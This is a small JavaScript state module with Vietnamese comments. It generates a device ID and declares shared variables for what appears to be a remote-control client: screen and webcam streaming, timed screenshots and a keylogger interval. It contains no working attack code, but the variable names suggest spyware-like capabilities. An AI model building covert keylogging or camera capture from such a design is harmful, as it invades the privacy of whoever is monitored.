// modules/store.js (NANG CAP: Tao Device ID)
// File nay chua cac bien "toan cuc" (state) cua ung dung
// de cac module khac co a chia se.

// === FIX 3: Tao Ma Dinh Danh (Device ID) ===
// (Day la logic ban da co tu file L11)
let DEVICE_ID = localStorage.getItem("rc_device_id");
if (!DEVICE_ID) {
  // Tao ID ngau nhien, vi du: "CL_f1b9"
  DEVICE_ID = "CL_" + Math.random().toString(16).substring(2, 6);
  localStorage.setItem("rc_device_id", DEVICE_ID);
}
// === KET THUC FIX ===

// 'store' la mot object dung chung
export const store = {
  db: null, // Doi tuong IndexedDB

  DEVICE_ID: DEVICE_ID, // Ma dinh danh cua client nay
  // clientInfo: null, // Socket (se duoc gateway gui ve)
  clientIP: null,

  socketReady: false,

  // Bien de theo doi trang thai stream
  isScreenStreamOn: false,
  isCamStreamOn: false,

  // Bien luu bo dem thoi gian
  autoShotInt: null,
  keylogInt: null,

  // Bien cho chuc nang chup anh
  isSavingScreenshot: false,
};
